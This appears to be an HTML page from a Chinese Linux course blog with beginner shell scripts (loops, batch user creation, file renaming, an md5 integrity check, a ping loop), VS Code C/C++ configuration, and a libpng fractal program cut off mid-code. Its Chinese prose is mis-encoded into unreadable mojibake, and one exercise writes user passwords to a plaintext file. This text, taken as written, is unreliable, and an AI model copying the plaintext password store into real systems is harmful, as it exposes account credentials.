title="å®éªŒ"></a>å®éªŒ</h2><ol><li><p>ç¼–å†™shellè„šæœ¬count-fix.shï¼Œå®ç°è®¡ç®—1+2+3+4+5+6+7+8+â€¦+100çš„å’Œï¼Œå¹¶è¾“å‡ºåˆ°å±å¹•ä¸Š,åˆ†åˆ«ä½¿ç”¨forå¾ªç¯ï¼Œwhileå¾ªç¯ç¼–å†™</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token shebang important">#!/bin/bash</span><span class="token assign-left variable">sum_for</span><span class="token operator">=</span><span class="token number">0</span><span class="token keyword">for</span> <span class="token variable"><span class="token punctuation">((</span>i<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span> i<span class="token operator">&lt;=</span><span class="token number">100</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">))</span></span><span class="token keyword">do</span>    <span class="token assign-left variable">sum_for</span><span class="token operator">=</span><span class="token variable"><span class="token variable">$((</span>sum_for <span class="token operator">+</span> i<span class="token variable">))</span></span><span class="token keyword">done</span><span class="token builtin class-name">echo</span> <span class="token string">"for: <span class="token variable">$sum_for</span>"</span><span class="token assign-left variable">sum_while</span><span class="token operator">=</span><span class="token number">0</span><span class="token assign-left variable">j</span><span class="token operator">=</span><span class="token number">1</span><span class="token keyword">while</span> <span class="token punctuation">[</span> <span class="token variable">$j</span> <span class="token parameter variable">-le</span> <span class="token number">100</span> <span class="token punctuation">]</span><span class="token keyword">do</span>    <span class="token assign-left variable">sum_while</span><span class="token operator">=</span><span class="token variable"><span class="token variable">$((</span>sum_while <span class="token operator">+</span> j<span class="token variable">))</span></span>    <span class="token assign-left variable">j</span><span class="token operator">=</span><span class="token variable"><span class="token variable">$((</span>j <span class="token operator">+</span> <span class="token number">1</span><span class="token variable">))</span></span><span class="token keyword">done</span><span class="token builtin class-name">echo</span> <span class="token string">"while: <span class="token variable">$sum_while</span>"</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>ä½¿ç”¨bashçš„forå¾ªç¯è¯­å¥ç¼–å†™ä¸€è„šæœ¬batchmkdir.shï¼Œèƒ½å®ç°ä»¥ä¸‹åŠŸèƒ½ï¼šåœ¨å½“å‰ç›®å½•ä¸­å»ºç«‹10ä¸ªç›®å½•ï¼Œç›®å½•çš„å‘½åå½¢å¼ä¸ºdir-1ã€dir-2ã€dir-3ã€â€¦..dir-20ï¼Œåœ¨ç¨‹åºä¸­æ³¨æ„å…ˆåˆ¤æ–­å¾…å»ºç«‹çš„ç›®å½•æ˜¯å¦å·²ç»å­˜åœ¨ã€‚</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token shebang important">#!/bin/bash</span><span class="token keyword">for</span> <span class="token variable"><span class="token punctuation">((</span>i<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span> i<span class="token operator">&lt;=</span><span class="token number">10</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">))</span></span><span class="token keyword">do</span>    <span class="token assign-left variable">dir_name</span><span class="token operator">=</span><span class="token string">"dir-<span class="token variable">$i</span>"</span>    <span class="token comment"># æ£€æŸ¥ç›®å½•æ˜¯å¦å·²å­˜åœ¨</span>    <span class="token keyword">if</span> <span class="token punctuation">[</span> <span class="token operator">!</span> <span class="token parameter variable">-d</span> <span class="token string">"<span class="token variable">$dir_name</span>"</span> <span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token keyword">then</span>        <span class="token function">mkdir</span> <span class="token string">"<span class="token variable">$dir_name</span>"</span>    <span class="token keyword">fi</span><span class="token keyword">done</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>ç¼–å†™ä¸€ä¸ªshellè„šæœ¬count.shï¼Œå®ç°å¦‚ä¸‹åŠŸèƒ½ï¼Œç”¨æˆ·å¯ä»¥åœ¨count.shè„šæœ¬åé¢è·Ÿä¸åŒæ•°å­—çš„å‘½ä»¤è¡Œå‚æ•°ï¼Œä½¿å¾—è„šæœ¬èƒ½è®¡ç®—ä¸åŒæ•°å­—çš„è¿åŠ å’Œï¼Œå¹¶åœ¨è„šæœ¬ä¸­æ³¨æ„åˆ¤æ–­ç”¨æˆ·æ˜¯å¦è¾“å…¥äº†ä¸€ä¸ªå‚æ•°ï¼Œå¦‚å½“ç”¨æˆ·ä»¥â€œ.&#x2F;count.sh 30â€è¿è¡Œè„šæœ¬æ—¶ï¼Œèƒ½è®¡ç®—1+2+3+4+â€¦+30ï¼Œå¦‚æœç”¨æˆ·æ²¡æœ‰è¾“å…¥å‚æ•°ï¼Œåˆ™é»˜è®¤è®¡ç®—1åˆ°10çš„è¿åŠ å’Œã€‚</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token shebang important">#!/bin/bash</span><span class="token keyword">if</span> <span class="token punctuation">[</span> <span class="token variable">$#</span> <span class="token parameter variable">-eq</span> <span class="token number">0</span> <span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token keyword">then</span>    <span class="token assign-left variable">end_num</span><span class="token operator">=</span><span class="token number">10</span><span class="token keyword">else</span>    <span class="token assign-left variable">end_num</span><span class="token operator">=</span><span class="token variable">$1</span><span class="token keyword">fi</span><span class="token assign-left variable">sum</span><span class="token operator">=</span><span class="token number">0</span><span class="token keyword">for</span> <span class="token variable"><span class="token punctuation">((</span>i<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span> i<span class="token operator">&lt;=</span>$end_num<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">))</span></span><span class="token keyword">do</span>    <span class="token assign-left variable">sum</span><span class="token operator">=</span><span class="token variable"><span class="token variable">$((</span>sum <span class="token operator">+</span> i<span class="token variable">))</span></span><span class="token keyword">done</span><span class="token builtin class-name">echo</span> <span class="token string">"å’Œä¸º: <span class="token variable">$sum</span>"</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>ç¼–å†™ä¸€ä¸ªè„šæœ¬batchuser.shï¼Œèƒ½æ‰¹é‡å»ºç«‹10ä¸ªç”¨æˆ·å¸å·ï¼Œå¹¶ç»™ç”¨æˆ·å¸å·è®¾å®š8ä½çš„éšæœºå¯†ç ï¼ŒåŒæ—¶æŠŠè¯¥ç”¨æˆ·åä¸å¯†ç ä¿å­˜åˆ°æŒ‡å®šçš„æ–‡ä»¶ä¸­&#x2F;root&#x2F;user-pass.txtï¼Œä»¥ä¾¿ç®¡ç†å‘˜åˆ†å‘å¯†ç ï¼›å…¶ä¸­å¸å·çš„å½¢å¼ä¸ºuser1ã€user2ã€â€¦user10ï¼›ä¿å­˜ç”¨æˆ·åä¸å¯†ç çš„æ–‡ä»¶çš„æ¯è¡Œçš„æ ¼å¼å½¢å¼ä¸ºï¼šuser1:ChczVZww</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token shebang important">#!/bin/bash</span><span class="token keyword">for</span> <span class="token variable"><span class="token punctuation">((</span>i<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span> i<span class="token operator">&lt;=</span><span class="token number">10</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">))</span></span><span class="token keyword">do</span>    <span class="token assign-left variable">username</span><span class="token operator">=</span><span class="token string">"user<span class="token variable">$i</span>"</span>    <span class="token assign-left variable">password</span><span class="token operator">=</span><span class="token variable"><span class="token variable">$(</span>openssl rand <span class="token parameter variable">-base64</span> <span class="token number">6</span><span class="token variable">)</span></span>    <span class="token function">useradd</span> <span class="token parameter variable">-m</span> <span class="token variable">$username</span>    <span class="token builtin class-name">echo</span> <span class="token parameter variable">-e</span> <span class="token string">"<span class="token variable">$password</span><span class="token entity" title="\n">\n</span><span class="token variable">$password</span>"</span> <span class="token operator">|</span> <span class="token function">passwd</span> <span class="token variable">$username</span> <span class="token parameter variable">--stdin</span>    <span class="token builtin class-name">echo</span> <span class="token string">"<span class="token variable">$username</span>:<span class="token variable">$password</span>"</span> <span class="token operator">>></span> /root/user-pass.txt<span class="token keyword">done</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>ç¼–å†™ä¸€ä¸ªshellè„šæœ¬ï¼Œå®ç°ä»¥ä¸‹åŠŸèƒ½ï¼šè¯¥è„šæœ¬èƒ½è¯»å–usernamelist.txtä¸­çš„ç”¨æˆ·åˆ—è¡¨ï¼ˆä¸€è¡Œä¸€ä¸ªç”¨æˆ·åï¼‰å»ºç«‹å¸å·ï¼Œå¹¶ç»™æ¯ä¸ªå¸å·è®¾ç½®8ä½éšæœºå¯†ç ï¼ŒåŒæ—¶æŠŠè¯¥ç”¨æˆ·åä¸å¯†ç ä¿å­˜åˆ°æŒ‡å®šuserpass.txt æ–‡ä»¶ä¸­ï¼Œå¯†ç æ–‡ä»¶çš„æ ¼å¼åŒç¬¬4é¢˜çš„è¦æ±‚ã€‚è¦æ±‚è¦è·³è¿‡ç©ºè¡Œã€‚</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token shebang important">#!/bin/bash</span><span class="token keyword">while</span> <span class="token assign-left variable"><span class="token environment constant">IFS</span></span><span class="token operator">=</span> <span class="token builtin class-name">read</span> <span class="token parameter variable">-r</span> username<span class="token keyword">do</span>    <span class="token keyword">if</span> <span class="token punctuation">[</span> <span class="token parameter variable">-z</span> <span class="token string">"<span class="token variable">$username</span>"</span> <span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token keyword">then</span>        <span class="token builtin class-name">continue</span>    <span class="token keyword">fi</span>    <span class="token assign-left variable">password</span><span class="token operator">=</span><span class="token variable"><span class="token variable">$(</span>openssl rand <span class="token parameter variable">-base64</span> <span class="token number">6</span><span class="token variable">)</span></span>    <span class="token function">useradd</span> <span class="token parameter variable">-m</span> <span class="token variable">$username</span>    <span class="token builtin class-name">echo</span> <span class="token parameter variable">-e</span> <span class="token string">"<span class="token variable">$password</span><span class="token entity" title="\n">\n</span><span class="token variable">$password</span>"</span> <span class="token operator">|</span> <span class="token function">passwd</span> <span class="token variable">$username</span> <span class="token parameter variable">--stdin</span>    <span class="token builtin class-name">echo</span> <span class="token string">"<span class="token variable">$username</span>:<span class="token variable">$password</span>"</span> <span class="token operator">>></span> userpass.txt<span class="token keyword">done</span> <span class="token operator">&lt;</span> <span class="token string">"usernamelist.txt"</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>è„šæœ¬capprintfile.sh</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token keyword">for</span> <span class="token for-or-select variable">file</span> <span class="token keyword">in</span> <span class="token string">"<span class="token variable">$@</span>"</span><span class="token keyword">do</span> <span class="token builtin class-name">echo</span> <span class="token variable">$file</span><span class="token operator">|</span><span class="token function">tr</span> a-z A-Z<span class="token keyword">done</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>å»ºç«‹ç›®å½• &#x2F;root&#x2F;lab-shell&#x2F;ï¼Œå¹¶ä½¿ç”¨ touch å‘½ä»¤å»ºç«‹ä¸€äº›ç©ºæ–‡ä»¶æˆ–è€…ä½¿ç”¨ mkdir å»ºç«‹ä¸€äº›ç›®å½•ï¼Œç„¶åä»¥<code>./capprintfile.sh /  /root/lab-shell/*</code> çš„å½¢å¼è¿è¡Œè„šæœ¬ï¼Œè§‚å¯Ÿç»“æœ</p><p><img src="/blog/2024/12/16/Linux%E4%BB%8E0-5%E5%88%B01/wps25.jpg" alt="img"></p><p>ç¼–å†™ä¸€ä¸ªè„šæœ¬ï¼Œèƒ½æŠŠæŒ‡å®šç›®å½•&#x2F;root&#x2F;lab-shell&#x2F;ä¸­çš„æ–‡ä»¶çš„æ–‡ä»¶åå…¨æ”¹åä¸ºå¤§å†™ï¼Œå¹¶æµ‹è¯•è¿è¡Œ</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token shebang important">#!/bin/bash</span><span class="token builtin class-name">cd</span> /root/lab-shell/<span class="token keyword">for</span> <span class="token for-or-select variable">file</span> <span class="token keyword">in</span> *<span class="token keyword">do</span>    <span class="token keyword">if</span> <span class="token punctuation">[</span> <span class="token parameter variable">-f</span> <span class="token string">"<span class="token variable">$file</span>"</span> <span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token keyword">then</span>        <span class="token assign-left variable">new_name</span><span class="token operator">=</span><span class="token variable"><span class="token variable">$(</span><span class="token builtin class-name">echo</span> <span class="token string">"<span class="token variable">$file</span>"</span> <span class="token operator">|</span> <span class="token function">tr</span> <span class="token string">'[:lower:]'</span> <span class="token string">'[:upper:]'</span><span class="token variable">)</span></span>        <span class="token function">mv</span> <span class="token string">"<span class="token variable">$file</span>"</span> <span class="token string">"<span class="token variable">$new_name</span>"</span>    <span class="token keyword">fi</span><span class="token keyword">done</span><span class="token builtin class-name">echo</span> <span class="token string">"Finished"</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>è®¾è®¡ä¸€ä¸ªè„šæœ¬checkmd5.shï¼Œå®ç°ç”¨äºæ£€æµ‹Linuxç³»ç»ŸæŸäº›ç‰¹å®šé‡è¦æ–‡ä»¶æ˜¯å¦è¢«ä¿®æ”¹çš„åŠŸèƒ½</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token shebang important">#!/bin/bash</span><span class="token keyword">if</span> <span class="token punctuation">[</span> <span class="token string">"<span class="token variable">$#</span>"</span> <span class="token parameter variable">-ne</span> <span class="token number">1</span> <span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token keyword">then</span>    <span class="token builtin class-name">echo</span> <span class="token string">"Usage: <span class="token variable">$0</span> &lt;file_list_with_md5sum>"</span>    <span class="token builtin class-name">exit</span> <span class="token number">1</span><span class="token keyword">fi</span><span class="token keyword">if</span> <span class="token punctuation">[</span> <span class="token operator">!</span> <span class="token parameter variable">-f</span> <span class="token string">"<span class="token variable">$1</span>"</span> <span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token keyword">then</span>    <span class="token builtin class-name">echo</span> <span class="token string">"Error: æ–‡ä»¶åˆ—è¡¨ä¸å­˜åœ¨."</span>    <span class="token builtin class-name">exit</span> <span class="token number">1</span><span class="token keyword">fi</span><span class="token keyword">while</span> <span class="token assign-left variable"><span class="token environment constant">IFS</span></span><span class="token operator">=</span> <span class="token builtin class-name">read</span> <span class="token parameter variable">-r</span> line<span class="token keyword">do</span>    <span class="token assign-left variable">file</span><span class="token operator">=</span><span class="token variable"><span class="token variable">$(</span><span class="token builtin class-name">echo</span> <span class="token string">"<span class="token variable">$line</span>"</span> <span class="token operator">|</span> <span class="token function">awk</span> <span class="token string">'&#123;print $1&#125;'</span><span class="token variable">)</span></span>    <span class="token assign-left variable">expected_md5</span><span class="token operator">=</span><span class="token variable"><span class="token variable">$(</span><span class="token builtin class-name">echo</span> <span class="token string">"<span class="token variable">$line</span>"</span> <span class="token operator">|</span> <span class="token function">awk</span> <span class="token string">'&#123;print $2&#125;'</span><span class="token variable">)</span></span>        <span class="token assign-left variable">current_md5</span><span class="token operator">=</span><span class="token variable"><span class="token variable">$(</span>md5sum <span class="token string">"<span class="token variable">$file</span>"</span> <span class="token operator">|</span> <span class="token function">awk</span> <span class="token string">'&#123;print $1&#125;'</span><span class="token variable">)</span></span>    <span class="token keyword">if</span> <span class="token punctuation">[</span> <span class="token string">"<span class="token variable">$current_md5</span>"</span> <span class="token operator">!=</span> <span class="token string">"<span class="token variable">$expected_md5</span>"</span> <span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token keyword">then</span>        <span class="token builtin class-name">echo</span> <span class="token string">"æ–‡ä»¶ <span class="token variable">$file</span> å·²è¢«ä¿®æ”¹ï¼"</span>    <span class="token keyword">else</span>        <span class="token builtin class-name">echo</span> <span class="token string">"æ–‡ä»¶ <span class="token variable">$file</span> æœªè¢«ä¿®æ”¹ã€‚"</span>    <span class="token keyword">fi</span><span class="token keyword">done</span> <span class="token operator">&lt;</span> <span class="token string">"<span class="token variable">$1</span>"</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ol><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token shebang important">#!/bin/bash</span><span class="token comment"># æ£€æŸ¥å‚æ•°æ˜¯å¦æ­£ç¡®</span><span class="token keyword">if</span> <span class="token punctuation">[</span> <span class="token variable">$#</span> <span class="token parameter variable">-ne</span> <span class="token number">1</span> <span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token keyword">then</span>    <span class="token builtin class-name">echo</span> <span class="token string">"Usage: <span class="token variable">$0</span> &lt;ip_list_file>"</span>    <span class="token builtin class-name">exit</span> <span class="token number">1</span><span class="token keyword">fi</span><span class="token assign-left variable">ip_list_file</span><span class="token operator">=</span><span class="token variable">$1</span><span class="token comment"># æ£€æŸ¥æ–‡ä»¶æ˜¯å¦å­˜åœ¨</span><span class="token keyword">if</span> <span class="token punctuation">[</span> <span class="token operator">!</span> <span class="token parameter variable">-f</span> <span class="token string">"<span class="token variable">$ip_list_file</span>"</span> <span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token keyword">then</span>    <span class="token builtin class-name">echo</span> <span class="token string">"Error: File <span class="token variable">$ip_list_file</span> not found."</span>    <span class="token builtin class-name">exit</span> <span class="token number">1</span><span class="token keyword">fi</span><span class="token comment"># é€è¡Œè¯»å– IP åœ°å€å¹¶è¿›è¡Œ ping æµ‹è¯•</span><span class="token keyword">while</span> <span class="token assign-left variable"><span class="token environment constant">IFS</span></span><span class="token operator">=</span> <span class="token builtin class-name">read</span> <span class="token parameter variable">-r</span> <span class="token function">ip</span><span class="token punctuation">;</span> <span class="token keyword">do</span>    <span class="token builtin class-name">echo</span> <span class="token string">"Pinging IP: <span class="token variable">$ip</span>"</span>    <span class="token function">ping</span> <span class="token parameter variable">-c</span> <span class="token number">1</span> <span class="token variable">$ip</span> <span class="token operator">></span> /dev/null    <span class="token keyword">if</span> <span class="token punctuation">[</span> <span class="token variable">$?</span> <span class="token parameter variable">-eq</span> <span class="token number">0</span> <span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token keyword">then</span>        <span class="token builtin class-name">echo</span> <span class="token string">"Ping successful"</span>    <span class="token keyword">else</span>        <span class="token builtin class-name">echo</span> <span class="token string">"Ping failed"</span>    <span class="token keyword">fi</span><span class="token keyword">done</span> <span class="token operator">&lt;</span> <span class="token string">"<span class="token variable">$ip_list_file</span>"</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr><h1 id="Linux-gccæºç ç¼–è¯‘"><a href="#Linux-gccæºç ç¼–è¯‘" class="headerlink" title="Linux gccæºç ç¼–è¯‘"></a>Linux gccæºç ç¼–è¯‘</h1><h2 id="ç¯å¢ƒé…ç½®"><a href="#ç¯å¢ƒé…ç½®" class="headerlink" title="ç¯å¢ƒé…ç½®"></a>ç¯å¢ƒé…ç½®</h2><p>åœ¨æ–°ç‰ˆæœ¬çš„Linuxå‘è¡Œç‰ˆä¸­ï¼Œè¿™é‡Œé€‰æ‹©é“¶æ²³éº’éºŸï¼Œå®‰è£…é…ç½®vscodeï¼Œå°è¯•é…ç½®å¥½c&#x2F;c++çš„ç¼–ç¨‹å¼€å‘ç¯å¢ƒ</p><p>åœ¨vscodeå®˜ç½‘ä¸Šä¸‹è½½debï¼š<a href="https://code.visualstudio.com/docs/?dv=linux64_deb">https://code.visualstudio.com/docs/?dv=linux64_deb</a></p><p>ç„¶åå®‰è£…</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> dpkg <span class="token parameter variable">-i</span> code_1.95.3-1731513102_amd64.deb<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/blog/2024/12/16/Linux%E4%BB%8E0-5%E5%88%B01/image-20241203203646070.png" alt="image-20241203203646070"></p><p>æ¥ä¸‹æ¥é…ç½®c&#x2F;c++çš„å¼€å‘ç¯å¢ƒ</p><p>å…ˆå‡†å¤‡å¥½ gcc ï¼Œ g++ å’Œ gdb</p><p><img src="/blog/2024/12/16/Linux%E4%BB%8E0-5%E5%88%B01/image-20241203204406397.png" alt="image-20241203204406397"></p><p><img src="/blog/2024/12/16/Linux%E4%BB%8E0-5%E5%88%B01/image-20241203214320992.png" alt="image-20241203214320992"></p><p>ç„¶ååœ¨vscodeæ‰©å±•å•†åº—ä¸‹è½½ç›¸å…³æ‰©å±•</p><p><img src="/blog/2024/12/16/Linux%E4%BB%8E0-5%E5%88%B01/image-20241203205157452.png" alt="image-20241203205157452"></p><p>æ¥ä¸‹æ¥åœ¨å·¥ä½œåŒºç”Ÿæˆlaunch.jsonå’Œtasks.json</p><pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token punctuation">&#123;</span>    <span class="token comment">// Use IntelliSense to learn about possible attributes.</span>    <span class="token comment">// Hover to view descriptions of existing attributes.</span>    <span class="token comment">// For more information, visit: https://go.microsoft.com/fwlink/?linkid=830387</span>    <span class="token property">"version"</span><span class="token operator">:</span> <span class="token string">"0.2.0"</span><span class="token punctuation">,</span>    <span class="token property">"configurations"</span><span class="token operator">:</span> <span class="token punctuation">[</span>         <span class="token punctuation">&#123;</span>            <span class="token property">"name"</span><span class="token operator">:</span> <span class="token string">"g++ - Build and debug active file"</span><span class="token punctuation">,</span>            <span class="token property">"type"</span><span class="token operator">:</span> <span class="token string">"cppdbg"</span><span class="token punctuation">,</span>            <span class="token property">"request"</span><span class="token operator">:</span> <span class="token string">"launch"</span><span class="token punctuation">,</span>            <span class="token property">"program"</span><span class="token operator">:</span> <span class="token string">"$&#123;fileDirname&#125;/$&#123;fileBasenameNoExtension&#125;"</span><span class="token punctuation">,</span>            <span class="token property">"args"</span><span class="token operator">:</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span>            <span class="token property">"stopAtEntry"</span><span class="token operator">:</span> <span class="token boolean">false</span><span class="token punctuation">,</span>            <span class="token property">"cwd"</span><span class="token operator">:</span> <span class="token string">"$&#123;fileDirname&#125;"</span><span class="token punctuation">,</span>            <span class="token property">"environment"</span><span class="token operator">:</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span>            <span class="token property">"externalConsole"</span><span class="token operator">:</span> <span class="token boolean">false</span><span class="token punctuation">,</span>            <span class="token property">"MIMode"</span><span class="token operator">:</span> <span class="token string">"gdb"</span><span class="token punctuation">,</span>            <span class="token property">"setupCommands"</span><span class="token operator">:</span> <span class="token punctuation">[</span>                <span class="token punctuation">&#123;</span>                    <span class="token property">"description"</span><span class="token operator">:</span> <span class="token string">"Enable pretty-printing for gdb"</span><span class="token punctuation">,</span>                    <span class="token property">"text"</span><span class="token operator">:</span> <span class="token string">"-enable-pretty-printing"</span><span class="token punctuation">,</span>                    <span class="token property">"ignoreFailures"</span><span class="token operator">:</span> <span class="token boolean">true</span>                <span class="token punctuation">&#125;</span>            <span class="token punctuation">]</span><span class="token punctuation">,</span>            <span class="token property">"preLaunchTask"</span><span class="token operator">:</span> <span class="token string">"C/C++: g++ build active file"</span><span class="token punctuation">,</span>            <span class="token property">"miDebuggerPath"</span><span class="token operator">:</span> <span class="token string">"/usr/bin/gdb"</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">]</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token punctuation">&#123;</span>    <span class="token property">"version"</span><span class="token operator">:</span> <span class="token string">"2.0.0"</span><span class="token punctuation">,</span>    <span class="token property">"tasks"</span><span class="token operator">:</span> <span class="token punctuation">[</span>        <span class="token punctuation">&#123;</span>            <span class="token property">"type"</span><span class="token operator">:</span> <span class="token string">"cppbuild"</span><span class="token punctuation">,</span>            <span class="token property">"label"</span><span class="token operator">:</span> <span class="token string">"C/C++: g++ build active file"</span><span class="token punctuation">,</span>            <span class="token property">"command"</span><span class="token operator">:</span> <span class="token string">"/usr/bin/g++"</span><span class="token punctuation">,</span>            <span class="token property">"args"</span><span class="token operator">:</span> <span class="token punctuation">[</span>                <span class="token string">"-g"</span><span class="token punctuation">,</span>                <span class="token string">"$&#123;file&#125;"</span><span class="token punctuation">,</span>                <span class="token string">"-o"</span><span class="token punctuation">,</span>                <span class="token string">"$&#123;fileDirname&#125;/$&#123;fileBasenameNoExtension&#125;"</span>            <span class="token punctuation">]</span><span class="token punctuation">,</span>            <span class="token property">"options"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>                <span class="token property">"cwd"</span><span class="token operator">:</span> <span class="token string">"$&#123;fileDirname&#125;"</span>            <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>            <span class="token property">"problemMatcher"</span><span class="token operator">:</span> <span class="token punctuation">[</span>                <span class="token string">"$gcc"</span>            <span class="token punctuation">]</span><span class="token punctuation">,</span>            <span class="token property">"group"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>                <span class="token property">"kind"</span><span class="token operator">:</span> <span class="token string">"build"</span><span class="token punctuation">,</span>                <span class="token property">"isDefault"</span><span class="token operator">:</span> <span class="token boolean">true</span>            <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>            <span class="token property">"detail"</span><span class="token operator">:</span> <span class="token string">"compiler: /usr/bin/g++"</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">]</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>ç„¶åf5è°ƒè¯•ä¸ç¼–è¯‘</p><p><img src="/blog/2024/12/16/Linux%E4%BB%8E0-5%E5%88%B01/image-20241203214446936.png" alt="image-20241203214446936"></p><hr><h2 id="å®éªŒ1"><a href="#å®éªŒ1" class="headerlink" title="å®éªŒ1"></a>å®éªŒ1</h2><p>math_pic_png.c æ˜¯ä¸€ä¸ªèƒ½å¤Ÿè‡ªåŠ¨ç”Ÿæˆä¸€å¼  1024*1024 çš„æ•°å­¦åˆ†å½¢å›¾åƒçš„cä»£ç ï¼Œç”Ÿæˆçš„å›¾åƒæ•ˆæœå¦‚ math_png_rgb.png æ–‡ä»¶æ‰€ç¤º</p><p>å°è¯•åœ¨ rhel 6.3ã€ubuntu18.04 ä¸­ç¼–è¯‘å‡ºå¯æ‰§è¡Œç¨‹åºï¼Œå¹¶æµ‹è¯•è¿è¡Œ</p><p>math_pic_png.c</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdint.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;time.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;string.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;png.h></span></span><span class="token keyword">typedef</span> <span class="token keyword">struct</span> <span class="token class-name">pixel_RGB</span> <span class="token punctuation">&#123;</span>    png_byte red<span class="token punctuation">,</span> green<span class="token punctuation">,</span> black<span class="token punctuation">;</span><span class="token punctuation">&#125;</span> pixel_RGB<span class="token punctuation">;</span><span class="token class-name">uint8_t</span> <span class="token function">random_uint8</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">return</span> <span class="token function">rand</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">256</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">void</span> <span class="token function">write_data_to_png</span><span class="token punctuation">(</span>    <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span>png_name<span class="token punctuation">,</span>    png_uint_32 width<span class="token punctuation">,</span>    png_uint_32 height<span class="token punctuation">,</span>    png_bytepp  data<span class="token punctuation">,</span>    <span class="token keyword">int</span>         color_type<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    FILE       <span class="token operator">*</span>fp <span class="token operator">=</span> <span class="token function">fopen</span><span class="token punctuation">(</span>png_name<span class="token punctuation">,</span> <span class="token string">"wb"</span><span class="token 